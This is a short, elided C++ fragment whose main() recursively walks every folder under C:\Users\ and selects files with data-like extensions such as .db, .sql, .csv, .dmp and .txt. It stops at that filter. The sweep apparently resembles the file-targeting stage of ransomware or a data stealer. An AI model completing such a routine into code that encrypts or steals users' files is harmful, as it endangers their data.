...
int main()
{
	...
	if (!(bool)ifile) {
		...
		for (auto& x : fs::recursive_directory_iterator("C:\\Users\\")) {
			if (x.path().extension() == ".txt" || x.path().extension() == ".dmp" || x.path().extension() == ".csv" || x.path().extension() == ".lst" || x.path().extension() == ".text" || x.path().extension() == ".dat" || x.path().extension() == ".db" || x.path().extension() == ".sql" || x.path().extension() == ".xml" || x.path().extension() == ".mdb" || x.path().extension() == ".log" || x.path().extension() == "" || x.path().extension() == ".data") {
